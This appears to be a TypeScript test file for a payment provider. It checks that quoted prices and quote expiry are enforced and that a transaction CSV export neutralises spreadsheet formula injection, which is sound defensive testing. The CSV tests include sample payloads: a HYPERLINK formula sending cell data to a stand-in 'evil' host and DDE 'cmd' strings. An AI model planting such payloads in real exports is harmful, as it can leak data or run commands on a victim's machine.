import test from "node:test";
import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import { toCsv, type TxRecord } from "../src/txlog.ts";

/**
 * Two values this system publishes and did not enforce.
 *
 * The provider advertised a quote expiry and a surge price, signed both, and
 * then measured payment against neither. The transaction export quoted its
 * fields, which stops a comma breaking a column and does nothing about a
 * spreadsheet treating the cell as code. Different files, one shape: the thing
 * that was stated is not the thing that is checked.
 */

const providers = readFileSync(new URL("../../providers/src/app.ts", import.meta.url), "utf8");

// --- the provider's own quote ----------------------------------------------

test("the provider enforces the price it quoted, not the price it lists", () => {
  // Surge multipliers were optional for everybody: the paid path compared
  // against the catalogue constant while the signed quote carried up to 4x.
  assert.match(
    providers,
    /amount >= \(live\?\.price \?\? svc\.price\)/,
    "the quoted price is what the payment is measured against",
  );
});

test("an expired quote stops being spendable, and the map does not grow forever", () => {
  assert.match(providers, /if \(known && known\.expiresAt <= Date\.now\(\)\) issued\.delete\(qHash\)/,
    "expiresAt is read, not merely written");
  assert.match(providers, /if \(issued\.size >= QUOTE_SWEEP_AT\)/,
    "an unauthenticated 402 cannot grow the map without bound");
});

// --- the operator's CSV -----------------------------------------------------

const row = (over: Partial<TxRecord> = {}): TxRecord =>
  ({
    at: 0,
    actor: "0xabc",
    category: "agentic",
    action: "service-call",
    status: "success",
    detail: "",
    ...over,
  }) as TxRecord;

test("a visitor's string cannot become a formula in the operator's export", () => {
  // `detail` and `action` come from POST /api/history/mine, which any wallet
  // can reach; the export is requireOperator and spans every user's rows.
  const csv = toCsv([row({ detail: '=HYPERLINK("https://evil/?"&A1,"click")' })]);
  assert.match(csv, /"'=HYPERLINK/, "a leading = is neutralised with an apostrophe");

  for (const lead of ["+", "-", "@", "\t", "\r"]) {
    const out = toCsv([row({ action: `${lead}cmd|'/c calc'!A0` })]);
    assert.ok(out.includes(`"'${lead}cmd`), `a leading ${JSON.stringify(lead)} is neutralised`);
  }
});

test("neutralising formulas does not corrupt the numbers beside them", () => {
  // The naive fix prefixes every leading `-`, which turns a negative amount
  // into text and quietly breaks the column the export exists for.
  const csv = toCsv([row({ amount: "-12.5", valueUsd: "-3", detail: "ordinary text" })]);
  assert.ok(csv.includes('"-12.5"'), "a negative amount stays a number");
  assert.ok(csv.includes('"-3"'), "a negative value stays a number");
  assert.ok(!csv.includes("'-12.5"), "no apostrophe is added to numeric data");
  assert.ok(csv.includes('"ordinary text"'), "ordinary text is untouched");
});

test("quoting still escapes what it always did", () => {
  const csv = toCsv([row({ detail: 'has "quotes" and, a comma' })]);
  assert.ok(csv.includes('"has ""quotes"" and, a comma"'));
});
